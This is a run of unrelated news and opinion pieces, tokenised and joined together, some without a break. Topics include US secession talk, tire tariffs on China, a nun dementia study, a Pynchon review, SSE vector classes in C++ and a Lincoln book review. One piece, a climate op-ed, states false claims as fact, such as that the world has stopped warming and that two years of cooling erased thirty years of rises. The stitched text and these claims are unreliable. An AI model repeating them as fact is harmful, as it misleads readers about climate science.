And of course , it is unclear whether or not Georgia would actually follow through with their threat to secede .
This seems to be an idea which is gaining more steam in the South .
This was 2 weeks before Texas Governor Perry brought up secession at a Tea Party .
I am in the process of conducting an interview with a Republican candidate for Governor of Texas in 2010 named Larry Kilgore who is running as a secessionist .
He ran in the primary last year for Senator and won about 225,000 voted and 18.5 % of the vote against a Republican incumbant .
A recent poll showed that 48 % of Texas Republicans and about 15 % of Texas Democrats favor secession .
This could be an interesting race to keep an eye on .
Here in Georgia , however , I have hardly heard a word about it .
Certainly not a word from any prominant State officials .
I had no idea that the State Senate was so overwhelmingly in favor of secession .
My guess is that many of those who voted in favor of the bill , entitled “ Affirming states ’ rights based on Jeffersonian principles ; and for other purposes ” did not read the bill .
This is why you read the bill before voting on it .
Bills often have titles that dont fully explain what they are about .

If you 've read Michael Pollan and you 've seen FOOD , INC . , chances are you 're not super - sizing your meals or expecting to find a movie - marketing doo - dad in your lunchbox .
However , chances are you still have many friends and family members convinced " organic " is just a Madison Avenue buzzword to bilk city - slickers out of a few extra bucks .
And , sometimes they 're right .
Nevertheless , these folks remain transfixed with trans - fats , stuffing themselves with " food - like substances " that have shelf lives longer than the halflife of Plutonium 239 .
My mantra : if it wo n't rot , do n't eat it .
So , how do we introduce the issues surrounding organic food and farming ?
Consider this : EAT ME
That 's the title of The Warren Report 's half - hour special showcasing the documentary , THE REAL DIRT ON FARMER JOHN as well as interviews with the movie 's eponymous subject , author Nina Planck ( Real Food : What to Eat and Why ) and Colin McCrate , founder of The Seattle Urban Farm Company .
Together , they use facts , fun and implosion therapy to get me over my fear of dirt and my melon - picking ignorance .

Apple has said that Mac OS X 10.6 Snow Leopard will run in full 64 - bit mode on any 64 - bit capable Intel processor .
In fact , Snow Leopard 's 64 - bitness is one of its highly touted under - the - hood features .
But so far , the purported golden master build still wo n't boot in 64 - bit mode on a number of 64 - bit capable models .
That build , 10a432 , included release notes that detail running Snow Leopard in 64 - bit mode , meaning the underlying kernel is taking full advantage of the 64 - bit capabilities of the hardware .
According to the document , Apple is still asking developers to develop and test 64 - bit versions of any kernel extensions — most commonly device drivers — as Apple has been asking developers to do for some time .
Snow Leopard running in 64 - bit mode can only load drivers that are 64 - bit , and though Apple provides many common hardware drivers , some devices simply wo n't work without a custom one .
Only Intel Xserves will boot 64 - bit by default , and Apple lists a number of models that are capable of booting in 64 - bit by holding down the ' 6 ' and ' 4 ' keys while starting up .
Even still , not all machines with 64 - bit processors will boot into 64 - bit mode .
Specifically , some earlier Core 2 Duo- based Macs have a 32 - bit EFI firmware , and despite the fact that a 32 - bit EFI can load a 64 - bit kernel , Apple ( so far ) limits these machines from doing so .
Ironically , a tool to enable hackintoshes to boot Mac OS X can enable Macs with 32 - bit EFI firmware to boot Snow Leopard in 64 - bit mode .
Luckily , even if Snow Leopard boots into 32 - bit mode , it can still load and run 64 - bit applications just fine .
And , oddly , Apple notes that Snow Leopard Server builds boot into 64 - bit mode by default — why the client version still has the limitation is n't clear .
These details suggests to us in Orbiting HQ a couple of things , though .
Apple says that Snow Leopard is part of its transition to 64 - bit .
While Snow Leopard is a huge step in that direction — all the included applications in Snow Leopard are 64 - bit , for instance — not all of Apple 's machines in the last few years are 64 - bit capable ( like the MacBook 1,1 I 'm typing on right now ) .
Also , as of build 10a432 , it 's possible that even Apple might not have all the necessary device drivers for all 64 - bit - capable Macs fully tested and ready .
Still , since Apple lists a 64 - bit Intel processor as the only requirement for 64 - bit mode , we 're sure Apple will have this sorted out before Snow Leopard officially launches .
Of course , whether booting every 64 - bit capable machine into 64 - bit mode by default is the right thing for users is still not certain .
There are a number of performances gains to be had from doing so , but if it comes with compatibility headaches , Apple may be better off letting those will older machines decide for themselves to force 64 - bit mode if they desire .
Less savvy users will be none the wiser , as it will boot in 32 - bit mode and run 64 - bit applications without issue .

An ill - tempered women 's under - 19 soccer match between China and Australia has ended with a mass brawl and accusations of cheating , Chinese media has reported .
It was another blow for the reputation of Chinese football , two weeks after a referee was attacked by players in a men's inter- provincial tournament , resulting in one player being banned for life .
China won the Asian under -19s championship match 2 - 1 , holding on for victory despite a late appeal for a penalty from the Australians , who were aghast to see the referee award a free kick outside the box .
Australia 's Jessica Seaman was dismissed on full - time and a bench - clearing brawl ensued , with the Wuhan crowd joining in by pelting the visitors with water bottles as they left the pitch .
In a statement , Football Federation Australia ( FFA ) said it was aware of the incidents .
" We can confirm that the Young Matildas players and staff are unharmed and safe , " the FFA said .
" FFA is disappointed that ... players were the target of unacceptable crowd behaviour .
" FFA has taken up this matter with the AFC this morning .
" In the short term , the AFC has provided additional security to the Young Matildas for the remainder of their participation in the championship . "
China coach Gao Rongming blamed his team 's inexperience for their part in the incidents but Australia 's Alen Stajcic said the match was an embarrassment for the hosts .
" We 've prepared for 12 months to have an embarrassing sporting event take place like that in China , " he told the Asian Football Confederation ( AFC ) website .
" That 's not sport .
Sport 's played by two equal teams battling for sporting supremacy , not that kind of behaviour .
" On the field , off the field , it 's not good enough .
It 's not good enough .
I 'd be embarrassed if I were the host of this event after that game .
It 's not good enough . "
The tournament also acts as a qualifier for FIFA 's under - 20 World Cup and the defeat makes Australia unlikely to secure a spot in Germany for next year .
" We created many opportunities but some non-sporting factors decided this match , " Stajcic was quoted as saying by the Beijing News .
" Our opponents held up the game by faking dives and injuries , which caused our loss . "

WASHINGTON ( Reuters ) - U.S. President Barack Obama slapped steep additional duties on tire imports from China on Friday in a move that pleased domestic labor groups but drew a strong rebuke from Beijing .
“ The president decided to remedy the clear disruption to the U.S. tire industry based on the facts and the law in this case , ” White House spokesman Robert Gibbs said in a statement .
China swiftly denounced the decision .
“ China strongly condemns this grave act of trade protectionism by the U.S. , ” the spokesman for China ’s Ministry of Commerce , Yao Jian , said in a statement issued on the Ministry website ( www.mofcom.gov.cn)
Saturday .
“ This step not only violates the rules of the World Trade Organization , it is also contrary to the relevant commitments that the United States government made at the G20 financial summit . ”
The United Steelworkers union , which represents workers at many U.S. tire production plants , filed a petition earlier this year asking for the protection .
It said a tripling of tire imports from China to about 46 million in 2008 from about 15 million in 2004 had cost more than 5,000 U.S. tire worker jobs .
An additional 35 percent duty will be placed for a year on Chinese - made passenger vehicle and light truck tires , the White House said in a statement .
The new duty will take effect on September 26 and comes in addition to an existing 4 percent duty .
It would fall to 30 percent in the second year and 25 percent in the third year , the White House said .
Those levels are lower than the U.S. International Trade Commission had recommended , but likely still high enough to restrict tire imports significantly from China , if not shut them out completely .
“ For far too long , workers across this country have been victimized by bad trade policies and government inaction .
Today , President Obama made clear that he will enforce America ’s trade laws and stand with American workers , ” United Steelworkers President Leo Gerard said .
Trade skeptics in Congress also cheered the move .
“ Today , the President courageously stood up and enforced fair trade rules that will save jobs and help our communities , ” said Senator Sherrod Brown , an Ohio Democrat .
Tires are merely the latest of many Chinese - made products to face U.S. protective restrictions .
Beijing tends to respond to such restrictions by denouncing them and sometimes imposing apparent tit - for - tat measures on U.S. products , without launching broader trade wars .
It has also turned increasingly to the World Trade Organization to press its case .
TEST CASE FOR OBAMA
The ITC had recommended starting with a 55 percent tariff that would fall to 45 percent in year two and 35 percent in year three .
The steelworkers asked initially for a quota of 21 million that would grow by 5 percent each year .
The steelworkers ’ request for import curbs was widely seen as a test case for Obama , who faces pressures to project jobs at home while promoting free trade .
They filed their petition under “ Section 421 ” of U.S. trade law , which allows the United States to restrict imports from China in response to a market - disrupting surge .
China agreed to the “ safeguard ” measure when it joined the World Trade Organization in 2001 .
Until Friday , Washington had never used it against Beijing .
Former President George W. Bush rejected four similar petitions that reached his desk and the ITC rejected two other cases before they got that far .
Obama faced a deadline of next Thursday to make his decision in the case .
Analysts expect Friday ’s action to encourage other labor groups or domestic manufacturers to seek relief under Section 421 , which does not require petitioners to prove unfair trade practices are responsible for a surge in imports .
Chinese tire producers told the Obama administration last month that even an additional single - digit tariff would shut them out of the U.S. market because of low profit margins .
They currently supply about 17 percent of the U.S. tire market , although their shipments are down in 2009 .
No American tire manufacturer supported the case and one , Cooper Tire , publicly opposed it .
“ These tariffs are unwarranted .
It ’s troubling that the administration would invoke an import surge safeguard over the objections of U.S. industry and in response to falling imports .
Not a single U.S. tire company supports these taxes , ” said David Spooner , outside counsel for the Chinese tire industry .
U.S. tire wholesalers and retailers also warned a double - digit duty would cause them to cut jobs .
They argued that major U.S. tire manufacturers no longer wanted to produce the low - priced tires imported from China .
“ We are certainly disheartened that the president bowed to the union and disregarded the interests of thousands of other American workers and consumers , ” said Marguerite Trossevin , counsel to the American Coalition for Free Trade in Tires .
Nun Study — Language Skills Determine Alzheimer ’s Risk
Several media sources recently came out with results of a study of 38 Catholic nuns who donated their brains to science .
In this nun study at Johns Hopkins University School of Medicine , researchers compared nuns with normal cognitive functioning at the end of their lives with those with cognitive impairment , including Alzheimer ’s disease ( AD ) .
Here are the results :
10 had Alzheimer ’s
10 had asymptomatic Alzheimer ’s
5 had mild cognitive impairment
13 had no cognitive deficits or brain lesions
Asymptomatic Alzheimer ’s is when there are AD typical plaques and tangles in their brains , but the person still has unimpaired mental faculties throughout their lives .
What was the difference amongst these nuns ?
Those that had excellent language skills when they were younger diminished their chances of AD later in life .
The researchers were able to obtain essays of some of the subjects when they were in their late teens or early twenties when they joined the convent .
Grammatical complexity was unimportant , but those that were “ dense ” in ideas were less likely to develop AD or even mild impairment .
The researchers do not know why superior language ability appears to be protective against dementia and AD , but suspect it has something to do with forming more synapses early in life .
Lead author of the study was Dr. Juan C. Troncoso of Johns Hopkins University .
In Wired Science , he states , “ It ’s the first time that we show in humans that such a complex cognitive activity like idea density or language is connected with a neurodegenerative disease .
Now with this kind of paper , we have shown that we should focus not only on what we can see in the brain , but also on what we cannot see , the connection between cognition and pathology .
Our suspicion is that this is just the tip of the iceberg — there ’s so much that we still do n’t know about neural disease and the genesis of dementia . ”

“ Inherent Vice ” is Thomas Pynchon doing Raymond Chandler through a Jim Rockford looking glass , starring Cheech Marin ( or maybe Tommy Chong ) .
What could easily be mistaken as a paean to 1960s Southern California is also a sly herald of that era ’s end .
This , of course , is exactly the kind of layered meaning that readers expect of Pynchon .
His fans tend to be drawn to either his massive , bafflingly complex efforts -- the iconic , National Book Award - winning “ Gravity ’s Rainbow , ” “ Mason & Dixon ” and “ Against the Day ” -- or to the more constrained , plot - driven narratives of “ Vineland ” or “ The Crying of Lot 49 . ”
It is the big books , with their parades of gloriously obtuse set pieces , full of slapstick and conspiracy and minutely researched ephemera , that established Pynchon as a writer worthy of intense inquiry .
Yet having a plot does n’t make his work any less brilliant , any less Pynchonian .
“ Inherent Vice ” is a perfect case in point .
It has a plot .
It has a main character .
This clear structure will , no doubt , disappoint the big - book boosters , the obsessives who began contributing to the online wiki annotation of “ Against the Day ” before finishing its 1,085 pages .
But maybe we should all take a hit off a fat spliff and enjoy the dirty , brainy achievement of Pynchon ’s “ Vice . ”
At the center of “ Inherent Vice ” is Doc Sportello , a low - key private investigator living in a dingy bachelor pad in Gordita , a beach community with Venice ’s grit and Malibu ’s surfers and hills .
He has little affection for nonhippie flatlanders and a love of good weed .
But Doc is more law and order than his indica might indicate :
His occasional girlfriend is an assistant district attorney , and he ’s got an enduring across - the - divide , almost - friendship with Bigfoot Bjornsen , an LAPD detective who does Cal Worthington - like TV spots on the side .
It ’s these straight - world connections that bring Doc ’s ex-girlfriend Shasta Fay Hepworth to his doorstep asking for help .
In a detective fiction setup worthy of Chandler , Shasta -- a minor actress and mistress of real estate mogul Mickey Wolfmann -- tells
Doc that her lover ’s wife , who has a lover of her own , is trying to ship Mickey off to an insane asylum so she can take control of his fortune .
Doc takes the case , but before his investigation can get off the ground , he ’s accused of murder , picked up and released by the cops and the FBI and discovers that both Shasta and Mickey have gone missing .
No client , no money , but a mystery to solve .
Weirdness and obsession
Doc does true detective work -- dressing up in disguises , following leads -- yet he ’s stoned most of the time and easily distracted .
His world is full of Pynchonian weirdness : an ex-junkie sax player who has faked his own death and is living , unrecognized , with his band in Topanga Canyon ; a surfer who ventures out too far to catch impossible waves ; a lawyer fixated on the minutiae of “ Gilligan ’s Island ” and other trash TV ; and Mickey ’s collection of pornographic ties , decorated with images of his lovers -- although Shasta is conspicuously missing .
Nearly every character has an obsession or addiction .
Doc ’s almost constantly altered state allows the unreal to shimmer against reality like light on an ocean .
Sentences appear and Doc wonders if he ’s said them aloud ; he never finds out , and we ca n’t be sure .
A clue discovered on an acid trip is as valuable as anything learned while straight .
And his cannabis - induced paranoia is only a quarter turn from his detective work -- especially when he comes across references to the mysterious Golden Fang .
Doc knows the Golden Fang is a boat with a mysterious , historic past .
But it also seems to be a consortium of horny Silver Lake dentists , not to mention an Asian gang connected to drugs and money , Vietnam and China .
In classic Pynchon fashion , random incidents add up to conspiracy -- maybe .
Behind powerful figures loom shadowy , more powerful figures , and complex layers of knowledge lead to confusion as much as clarity .
There is also a lot of sex ( if little romance ) , many pop-culture allusions ( one scene references at least two classic noir films ) , characters who cross over from Pynchon ’s other work ( “ Vineland , ” predominantly ) and silly names galore .
It ’s easy to forget , among all his games and puzzles , that Pynchon can write razor - sharp beauty with the best of them .
A page - long description of the Santa Anas demands a place next to classic passages by Chandler and Joan Didion .
In Pynchon ’s big books , these devastating descriptions , particularly of place , are often swept away in the tide of prose and characters .
Here , in a novel that focuses on Los Angeles so sharply that Tommy ’s is pinpointed by its cross streets , they shine .
L.A. on his mind
Pynchon , now 72 , apparently lived in Southern California in the 1960s , and the attention to L.A. 's geography implies that the region has remained on his mind .
Maybe he ’s got a clear sense of recall -- or maybe he comes back to visit or has devoted time to exploring Google Maps ’ street views .
Either way , his details of the city are precise .
The Internet does make an appearance in “ Inherent Vice , ” with a reference to the pre-Web ARPAnet and a prescient sense of future connection .
“ Someday , ” a real estate agent says , “ there will be computers for all this , all you ’ll have to do ’s type in what you ’re looking for . . . and it ’ll be right back at you with more information than you ’d ever want to know , any lot in the L.A. Basin all the way back to the Spanish land grants -- water rights , encumbrances , mortgage histories , whatever you want . ”
The idea reads as both hope and lament .
And yet , if “ Inherent Vice ” exhibits nostalgia , it is not for the Los Angeles of yesteryear but for the days when genuine mystery was possible , when Doc ’s acid trip could be as relevant as Det.
Bjornsen ’s world , when complex layers could both contradict and coexist .
It ’s a love letter to a time when obsessives could n’t get all the answers from computers , when we might embrace the unknowable .
Still , after getting pretty far out , “ Inherent Vice ” eventually circles back and ties up all its loose ends .
It has a climactic moment , a cushiony denouement -- by gum , closure .
If this stands in counterpoint to Pynchon ’s most acclaimed work , perhaps we should pay heed to the novel ’s title : “ Inherent Vice ” refers to a hidden defect that undermines a property ’s worth , a marine - legal term for a Shakespearean flaw .
It could refer to Los Angeles ; it could refer to the 1960s .
Or it could refer to the author ’s work itself : With Pynchon ’s brilliance comes readability .

Hysteria is the real threat , not global warming
With Tony Blair launching his own plan to save the world ( groans ) , and the G8 leaders also unveiling their thoughts about global warming , this is a big week for environmental fanaticism .
Whatever he or they offer , it will not be enough to quell the warmists ' semi-religious fervour .
They are like medieval preachers , proclaiming to baying crowds that the end of the word is nigh .
On the agenda : World leaders will be debating climate change at the G8 summit in Italy this week
Well , is it ?
There are two separate climate issues - the extent of global warming and the role that humanity plays in it .
Some facts help .
The famous 1996 report by the International Panel on Climate Change predicted serious global warming and blamed mankind .
But , since then , the world has disobligingly stopped warming .
And two years of global cooling erased nearly 30 years of recorded temperature rises .
What was the worrying rise in temperature - so exciting for those whose computer models used the past to predict a grim future ?
Given the margin of error associated with the old - style thermometers which were , until only recently , used to record temperatures , it should be stated thus : over the past 100 years , temperature has risen by 0.7C - plus or minus 1.3 degrees !
The only importance the serious scientists can attach to such a figure is that less serious people think it meaningful .
My own science teacher would have kept me in after school for saying this was a valuable figure .
But , as you will have noticed , it worked .
The catastrophists piled in - some of whom had previously flourished warnings about global cooling .
For some , any figure will do , especially when it gives them a media profile ( and grants for research ) .
Those who worry about facts should look at the findings of NASA ( see the website ) , whose up - to - date and sophisticated global surveys throw such doubt on the warmists ' claims .
They should also read Heaven And Earth by Ian Plimer , Emeritus Professor of Earth Sciences at The University of Melbourne and Professor of Mining Geology at The University of Adelaide .
It is the best book on science and scientists I have ever read .
Piece by piece , he takes apart the work of the fanatics .
Far from denying global warming , he stresses its regularity and occasional abruptness and how humans have had to adapt .
A millennium ago , Greenland was warm , with a rich agriculture - not much man-made carbon gas then .
Over half of the past six million years , the climate was warmer than it is now .
He explains that the supposed consensus view of the IPCC is nonsense .
The much - touted 2,500 scientists supposed to have backed its conclusion included many non-scientists or were even the same contributors counted twice .
The finding that human activity influenced global climate involved the deletion of an original passage saying they had no evidence that greenhouse gases played a role and that the best answer was ' we do not know ' .
There is always a temptation to assume that anyone labelled a scientist thinks scientifically .
Learned philosophers have discussed how experiments are regularly conducted to prove a desired conclusion rather than to ascertain truth .
Prof Plimer provides the sharp - end view of this .
The use of computer models excites his particular disdain .
We have to adapt :
In his new book , Ian Plimer ( above ) stresses regularity and occasional abruptness of global warming
He cites 17 areas of science , ranging from tectonics to meteorology , which need to be utilised in analysing climate change .
No computer I have ever heard of can do this meaningfully .
In every area , conclusions , such as they are , are subject to wide margins of error ( and often fierce debate ) .
Simple multiplication demonstrates that even modest margins of error must collectively become magnified into enormous final ones .
As he says : ' If computer models torture the data enough , the data will confess to anything . '
Yet all this leaves a big problem .
If the data is really so inconclusive , not to say contradictory , why is the fanatics ' message so successful ?
This is a profoundly important phenomenon requiring the study of social , political , historical and even religious trends .
Catastrophists have , of course , always been with us .
There is something in humanity 's psyche which delights in impending disaster .
Politicians are attracted because the cause must involve a great increase in the power of government .
The supposed danger has also provided fuel for those who are determined , come what may , to demonstrate that capitalism and industrialisation are the roots of our woe .
The religious instinct is satisfied by the opportunity for pious preaching and noisy protest .
Yet the cause is so flawed .
Are we being conned ?
Yes , why not ?
Think of all the grand causes in our lifetime which have been bogus , starting with Iraq and Afghanistan and working backwards .
Or consider the dishonesty in public affairs , as in MPs ' expenses .
Fraud is the common coinage of public affairs .
Think , too , that it is little over 200 years since Europe stopped the execution of witches , and less than that since Spain finally abolished the Inquisition .
We are , of course , too enlightened now to be in danger of being carried away by superstition or hysteria - so we say .
The Ubiquitous SSE vector class : Debunking a common myth
On programming forums , every once in a while someone appears who wants to optimize his program by replacing his current 3D vector class by one that uses SSE opcodes , in the hope he 'll make his program run 4 times as fast .
Every seasoned programmer should directly see why it 's not going to work out that way - but still , instead of arguing the same points again and again in various forum threads , I decided to put it in writing once and for all , collecting most of the reasons why SSE vector classes are not as good an idea as they first seem .
Before I start , I want to make clear that this is only about the " classic " vector class layout with members x , y , z ( 3 components ) plus an additional " w " for 4 - component vectors , stored in a struct .
I am well aware that it is possible to gain quite dramatic improvements in a relatively general framework when using other data layouts , but that 's not the point of this article .
And , to make that clear , I 'm assuming you 're using C/C+ + and working on a x86 - compatible platform ( else you should n't care about " SSE " anyway , but duh , who knows ) .
Not that important First and foremost , your vector class is probably not as important for the performance of your program as you think ( and if it is , it 's more likely because you 're doing something wrong than because the computations are inefficient ) .
Do n't get me wrong , it 's probably going to be one of the most frequently used classes in your whole program , at least when doing 3D graphics .
But just because vector operations will be common does n't automatically mean that they 'll dominate the execution time of your program .
In other words , if your vector class turns out to be a major performance hog ( assuming you 've actually measured it , which , sadly , most people do n't ) , it 's more likely caused by lots of temporaries and unnecessary moving around of memory than by the actual computations .
There are of course exceptions here , like for example inner loops for software - based skinning , where you 're basically just doing a lot of vector - matrix multiplies and weighted adds ; however , in that case , using any kind of vector class is typically not the fastest way to do things anyway - in tight inner loops , expanding calculations by hand and optimizing common terms out etc. is important , and you 're not going to be able to do that if you hide everything behind your shiny vector class .
Not so hot
We 're now going to look at the somewhat dry but nonetheless very important aspects of memory usage and cache efficiency .
It turns out that a typical SSE vector class is n't particularly glorious from that viewpoint .
If you want to use data for SSE instructions , you 'd better make sure it 's 16 - byte aligned .
Because otherwise SSE arithmetic instructions wo n't be able to directly use it at all , and you have to use unaligned loads / stores , which are a lot slower and would eat up most of the advantage we gained from using SSE ( assuming there 's any ) in the first place .
Also , SSE operates on chunks of 4 floats , so what you 'll ( normally ) end up with is a 4 - component vector that has to be 16 - byte aligned .
Ignoring the mathematical advantages of working with 4D homogenous coordinates for now , this means that even our 3D coordinates ( usually the vast majority ) will be stored in 4 components , with the w component being 0 or 1 most of the time .
We 'll also have to make sure everything stays 16 byte aligned .
The latter is a rather annoying exercise in using compiler extensions to the language and the standard library to make sure alignment inside structures is 16 bytes and our memory allocations are 16 - byte aligned .
As SSE is inherently platform - specific anyway , that 's not much of a problem , even though it is rather annoying to have such low - level tinkering spread throughout your whole codebase by way of your vector class .
The former is more of a practical issue - we 're talking about wasting 25 % of memory for every instance of what is probably one of the most common data types in your program .
Again , due to alignment and memory allocator implementation aspects , we 'll have some amount of memory waste with all our data structures , but two - figure percent values are certainly pushing it .
And having that much clutter spread throughout your data is n't too nice on our cache usage either .
( If you do n't know about cache optimization , you should read up on it right now , because unlike replacing random calculations with SSE counterparts , cache - conscious design is actually going to give you some notable performance improvements ) .
Not easy
If that is n't enough to start you thinking twice , there 's more .
You might be tempted not to write the actual calculations in your vector class yourself , but link some library like D3DX that has " optimized implementations " of all of them instead .
For things like 4x4 Matrices , where common operations ( e.g. Matrix multiply ) actually have some notable amount of calculation going on , or Quaternions , which are tricky if you 're not used to the Maths and which you 're not going to use all other the place anyway , there 's nothing wrong with that .
But most calculations with 4D vectors are in the range of 4 - 9 scalar operations - not much .
In fact , it turns out that in your typical vector operation , you spend more time reading values into CPU registers and writing them back to memory than you will doing those calculations .
That 's why you typically want your vector arithmetic to be inlined by the compiler - the cost of these computations is normally a lot less than the explicit and implicit costs of a function call .
Which means that calling into external code to implement your vector operations is a very bad idea , no matter how well - optimized it is .
So you 'll have to implement itself .
Fine , there 's nothing wrong with that , at least in principle .
You 'll probably now start digging up an instruction reference , and start reading on SSE registers , instructions and how to write SSE code yourself .
Woops - you do n't have any experience writing x86 assembler ?
Tough luck , a lot more reading and learning then .
And even if you have experience , do n't worry , the next show stopper is just lurking around the corner :
Assembly language code is n't going to actually solve the problem either - you still have to get those values from memory and store them back afterwards .
When your code gets inlined , you 've saved the function call , but still the resulting code will consist of two - thirds movements from and to memory and only one - third of actual computation .
You do n't need to be an optimization guru to notice that this is not a very efficient way of using your processor .
Now you might hope that " the compiler will optimize that away " .
But again , you 're out of luck there - no compiler I know of will change inline assembler code in any way .
After all , there might be a good reason you 're periodically writing everything to memory and reading it back again .
Those variables might be used for communication between multiple threads , for example .
Or the memory might not even be real memory at all , but some hardware registers you 're accessing , whose contents change on every read operation .
In short , the compiler has no way of knowing what might go on " beyond the surface " in inline assembly code you write , so all compilers stay with the safe path , which is not touching such code at all .
No problem when your fragment of inline assembly does something noteworthy - but it means a lot of overhead when your code is just one real computation sandwitched between two memory accesses .
Well , we 're not yet through .
With current compilers , there 's another way to write SSE code : So - called intrinsics .
I 'm not going to give you the whole story here , but what it boils down to is that you get to treat SSE registers as if they were normal C++ variables , and the compiler exposes a lot of functions with funny names that compile to single SSE / MMX / whatever instructions .
In short , you still perform the opcode selection by hand , but the compiler handles instruction scheduling and register allocation for you .
It turns out that this is a lot more convenient than writing SSE code completely by hand .
And , even nicer , this way your compiler actually knows what you 're trying to do , so it can both perform proper inlining and optimize unnecessary memory accesses away .
In short , it not only looks quite convenient , it also seems like it 's the first really workable solution we 've encountered .
And it actually is - with some minor drawbacks , the most important one being that compilers have a tendency of generating rather weird code in places where intrinsics are used - useless memory accesses , that kind of thing .
So this is not going to be the solution if you 're looking for ultimate performance - but it's a lot besser than everything else we 've seen so far , so we 're gonna give it a shot and look at how far we get with it .

" DiLorenzo traces the onset of war to Southern resistance to the nationalist economic program . "
Why is The Real Lincoln so much superior to Harry Jaffa 's A New Birth of Freedom ?
Jaffa offers a purely textual study : as if he were dealing with Aristotle or Dante , he considers every nuance he can discover or manufacture in Lincoln 's speeches .
Professor DiLorenzo follows an entirely different course .
He compares Lincoln 's words with what he actually did , and the result is a historical rather than a mythological figure .
Our author confronts those who portray Lincoln as the Great Emancipator with a simple but devastating question .
If Lincoln was so much opposed to slavery , why did he not endeavor to abolish it peacefully through a scheme of compensated emancipation ?
Lincoln did pay lip service to various compensated emancipation plans , and he even proposed a compensated emancipation bill ( combined with colonization ) in 1862 .
But the man whom historians would later describe as one of the master politicians of all time failed to use his legendary political skills and rhetorical gifts to accomplish what every other country in the world where slavery had once existed had done ; end it peacefully , without resort to warfare .
( p. 52 )
How might Jaffa and his fellow Lincoln idolaters reply ?
Perhaps they would allege that Lincoln judged compensated emancipation politically impossible to realize and for that reason did not pursue it .
To this , DiLorenzo has a ready response :
Slavery was already in sharp decline in the border states and the upper South generally , mostly for economic reasons … there is evidence that there was growing political support within the border states for gradual , peaceful emancipation that would have ended slavery there .
( p. 51 )
But what if Lincoln took a different view ?
Here I think one must answer that he did not even investigate the question .
Would one not expect a sincere opponent of slavery to devote considerable attention to the feasibility of peacefully ending it ?
Further , " Roy Basler , the editor of Lincoln 's Collected Works , commented that Lincoln barely mentioned slavery before 1854 , and when he did , ' his words lacked effectiveness ' " ( pp. 54–55 ) .
As DiLorenzo ably argues , Lincoln 's real concerns lay elsewhere .
Throughout his political life , he enlisted himself under the banner of Henry Clay 's " American System . "
Proponents of this plan favored a strong central government in order to promote economic development .
In classic mercantilist fashion , Clay and his supporters wanted the government to direct the economy through spending on " internal improvements , " high protective tariffs , and a nationalized banking system .
Our author does not confine himself to a mere description of Lincoln 's economic goals .
He is an economist of distinction and readily locates the fallacies in these interventionist programs .
As one would expect from someone trained in both public - choice and Austrian economics , he at once seeks the self - interested motivations behind policies that profess to secure the national good .
Protectionism … was a means by which a government could dispense favors to well - connected ( and well - financed ) special interest groups , which in turn provided financial and other support for the politicians dispensing the favors .
It benefits both those industries that are protected from competition and the politicians , but it harms everyone else . …
The same can be said for another element of mercantilism — tax - funded subsidies to politically well - connected businesses and industries .
These subsidies generally benefit only those businesses that are lucky enough to get them , at the expense of the taxpayers generally .
( pp. 56 –57 )
Those inclined to defend Clay and his disciple Lincoln on the grounds that government must provide us with " public goods " such as roads would be well advised to read DiLorenzo 's discussion of the internal improvements voted by the Whig - dominated Illinois legislature .
The Illinois program proved a complete financial disaster , and other states that invested in internal improvements fared no better .
What all this suggests is that the Hamilton / Clay / Lincoln agenda of government subsidies for road building and railroad corporations was wildly unpopular throughout the nation and had been an abysmal failure in every instance .
( p. 83 )
The financial exactions of tariffs and internal improvements fell with especial force on the South .
The states in this region depended heavily on trade , and as a result paid most of the tariffs .
Since they were so dependent on trade , by 1860 the Southern states were paying in excess of 80 percent of all tariffs , while they believed that most of the revenue from the tariffs was being spent in the North .
In short , they believed they were being fleeced and plundered .
( p. 126 )
Small wonder that the South was not prepared to put up with Lincoln 's plans for even higher tariffs , and that the debate over secession stressed these financial exactions .
Like Charles Adams , in his excellent When in the Course of Human Events , DiLorenzo traces the onset of war to Southern resistance to the nationalist economic program , and Lincoln 's determination to enforce it .
To a very large extent , the secession of the Southern states in late 1860 and early 1861 was a culmination of the decades - long feud , beginning with the 1828 Tariff of Abominations , over the proper economic role of the central government .
Lincoln and the consolidationists wanted to construct a massive mercantilist state , whereas it was primarily Southern statesmen who always stood in their way .
These statesmen apparently believed that secession was their trump card . " ( pp. 128–29 )
DiLorenzo is amply prepared for the objection that even if the Southern states justly opposed Lincoln 's economic plans , they had no legal right to secede .
In this view , Lincoln had a constitutional duty to preserve the union by any means necessary .
Quite to the contrary , DiLorenzo shows that dominant legal opinion granted states the right to depart .
Nor was this exclusively a Southern view of the matter .
During the War of 1812 , many in New England favored abandoning the union ; and our author , relying on the research of Howard Cecil Perkins , points out that the majority of newspaper editorials in the North from late 1860 to mid-1861 recognized the right of secession .
Once the war began , Lincoln conducted himself as a thoroughgoing dictator , and DiLorenzo gives a full account of the president 's suppression of civil liberties .
Here we are on familiar ground , but our author shows great skill in prosecuting his case .
I found particularly impressive his identification of a line of defense essayed by some of Lincoln 's advocates .
Sometimes , writers on Lincoln and civil liberties describe in great detail Lincoln 's suppression of liberty , but conclude with praise for his " moderation . "
DiLorenzo with great force notes the discrepancy between evidence and conclusion .
Among the guilty is the foremost of all historians who have written on the topic , James G. Randall .
In chapter after chapter of his 595 - page book , Constitutional Problems Under Lincoln , he [ Randall ] dutifully describes not mere problems but the destruction of constitutional liberty .
He concludes almost every chapter with a string of excuses . …
The establishment of a dictatorship was not the overthrowing of the Constitution but merely " out of keeping with the normal tenor of American law . "
Nor were thousands of arbitrary arrests an example of tyranny but only " unfortunate , " and made , after all , with " the best of motives . " ( p. 160 )
Incredibly , the same pattern recurs among Lincoln 's partisans when they describe the gross violations of international law committed , with Lincoln 's entire approval , by Generals Sherman , Sheridan , Butler , and others .
After his bombardment of Atlanta , " Sherman 's army went on its usual binge of looting and burning . …
It has been estimated that more than 90 percent of the city was demolished " ( p. 186 ) .
As if this were not enough , Sherman expelled the remaining civilian residents from the city .
Nevertheless , Mark Grimsley , a leading military historian , " downplays the suffering of the citizens of Atlanta by saying that ' only ' a few thousand of them were evicted from their homes " ( p. 187 ) .
In the face of Sherman 's march to the sea and Sheridan 's burning of the Shenandoah Valley , Mark Neely writes that " Sherman and his ' fellow generals waged war the same way most Victorian gentlemen did , and other Victorian gentlemen in the world knew it . '
Total war , according to Neely , was just not Sherman 's cup of tea " ( p. 198 ) .
To attack Sherman and his cohorts is fortunately not very controversial , even in these times of abject Lincoln worship ; but to clearly state the obvious is no small virtue .
Professor DiLorenzo undertakes a much more difficult task , though , in his treatment of Reconstruction .
Here he undermines completely the arguments of the dominant approach to this period among contemporary American historians .
Early in the 20th century , W. A. Dunning and his students at Columbia University portrayed the Reconstruction period as , in the words of Claude Bowers , a " tragic era , " dominated by corruption .
